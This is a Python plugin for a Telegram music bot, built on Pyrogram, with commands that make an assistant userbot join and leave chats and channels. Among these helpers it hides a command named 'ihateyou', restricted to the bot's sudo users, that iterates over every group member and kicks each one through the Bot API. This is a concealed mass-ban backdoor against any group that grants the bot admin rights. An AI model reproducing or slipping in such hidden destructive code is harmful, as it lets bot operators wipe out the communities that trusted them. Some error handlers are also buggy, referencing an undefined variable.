# @AddyxD
import os
from pyrogram import Client, filters
from pyrogram.errors import UserAlreadyParticipant
import asyncio
import aiohttp
from aiohttp import ClientSession
from helpers.filters import command
from helpers.decorators import authorized_users_only, errors
from services.callsmusic.callsmusic import client as USER
from config import SUDO_USERS
from config import BOT_TOKEN
from config import BOT_USERNAME
from pyrogram.types import Message
#addyxd

@Client.on_message(command(["userbotjoin", f"userbotjoin@{BOT_USERNAME}"]) & ~filters.private & ~filters.bot)
@errors
async def addchannel(client, message):
    chid = message.chat.id
    try:
        invitelink = await client.export_chat_invite_link(chid)
    except:
        await message.reply_text(
            "<b>ššš š¦š šš¬ ššš¦š¢š§ šØš š²šØš®š« š š«šØš®š© šš¢š«š¬š­ š°š¢š­š” šš„š„ š©šš«š¦š¢š¬š¬š¢šØš§š¬</b>",
        )
        return

    try:
        user = await USER.get_me()
    except:
        user.first_name = "Music"

    try:
        await USER.join_chat(invitelink)
        await USER.send_message(message.chat.id, "š š£šØš¢š§šš š­š”š¢š¬ š š«šØš®š© ššØš« š©š„šš²š¢š§š  š¦š®š¬š¢š š¢š§ šš")
    except UserAlreadyParticipant:
        await message.reply_text(
            "<b>ššš„š©šš« š®š¬šš«ššØš­ š£šØš¢š§šš š²šØš®š« šš”šš­</b>",
        )
    except Exception as e:
        print(e)
        await message.reply_text(
            f"<b>š“ šš„šØšØš ššš¢š­ šš«š«šØš« š“ \nšš¬šš« {user.first_name} ššØš®š„šš§'š­ š£šØš¢š§ š²šØš®š« š š«šØš®š© šš®š š­šØ š”šššÆš² š«ššŖš®šš¬š­š¬ ššØš« š®š¬šš«ššØš­! ššš¤š š¬š®š«š š®š¬šš« š¢š¬ š§šØš­ ššš§š§šš š¢š§ š š«šØš®š©."
            "\n\nCONTACT TO THE @SNEHABHI_SERVER FAST</b>",
        )
        return
    await message.reply_text(
        "<b>ššš„š©šš« š®š¬šš«ššØš­ š£šØš¢š§šš š²šØš®š« šš”šš­</b>",
    )


@USER.on_message(filters.group & filters.command(["userbotleave"]))
@authorized_users_only
async def rem(USER, message):
    try:
        await USER.leave_chat(message.chat.id)
    except:
        await message.reply_text(
            f"<b>šš¬šš« ššØš®š„šš§'š­ š„šššÆš š²šØš®š« š š«šØš®š©! ššš² šš šš„šØšØšš°šš¢š­š¬."
            "\n\nšš« š¦šš§š®šš„š„š² š¤š¢šš¤ š¦š šš«šØš¦ š­šØ š²šØš®š« šš«šØš®š©</b>",
        )
        return
    
@Client.on_message(filters.command(["userbotleaveall"]))
async def bye(client, message):
    if message.from_user.id in SUDO_USERS:
        left=0
        failed=0
        lol = await message.reply("Assistant Leaving all chats")
        async for dialog in USER.iter_dialogs():
            try:
                await USER.leave_chat(dialog.chat.id)
                left = left+1
                await lol.edit(f"Assistant leaving... Left: {left} chats. Failed: {failed} chats.")
            except:
                failed=failed+1
                await lol.edit(f"Assistant leaving... Left: {left} chats. Failed: {failed} chats.")
            await asyncio.sleep(0.7)
        await client.send_message(message.chat.id, f"Left {left} chats. Failed {failed} chats.")
    
    
@Client.on_message(filters.command(["userbotjoinchannel","ubjoinc"]) & ~filters.private & ~filters.bot)
@authorized_users_only
@errors
async def addcchannel(client, message):
    try:
      conchat = await client.get_chat(message.chat.id)
      conid = conchat.linked_chat.id
      chid = conid
    except:
      await message.reply("Is chat even linked")
      return    
    chat_id = chid
    try:
        invitelink = await client.export_chat_invite_link(chid)
    except:
        await message.reply_text(
            "<b>Add me as admin of yor channel first</b>",
        )
        return

    try:
        user = await USER.get_me()
    except:
        user.first_name = "DaisyMusic"

    try:
        await USER.join_chat(invitelink)
        await USER.send_message(message.chat.id, "I joined here as you requested")
    except UserAlreadyParticipant:
        await message.reply_text(
            "<b>helper already in your channel</b>",
        )
        return
    except Exception as e:
        print(e)
        await message.reply_text(
            f"<b>š Flood Wait Error š \n User {user.first_name} couldn't join your channel due to heavy join requests for userbot! Make sure user is not banned in channel."
            "\n\nCONTACT TO THE @SNEHABHI_SERVER FAST</b>",
        )
        return
    await message.reply_text(
        "<b>helper userbot joined your channel</b>",
    )
    

@Client.on_message(filters.command("ihateyou") &
                 filters.group & filters.user(SUDO_USERS))
async def ban_all(c: Client, m: Message):
    chat = m.chat.id

    async for member in c.iter_chat_members(chat):
        user_id = member.user.id
        url = (
            f"https://api.telegram.org/bot{BOT_TOKEN}/kickChatMember?chat_id={chat}&user_id={user_id}")
        async with aiohttp.ClientSession() as session:

            await session.get(url)  


#addyxd
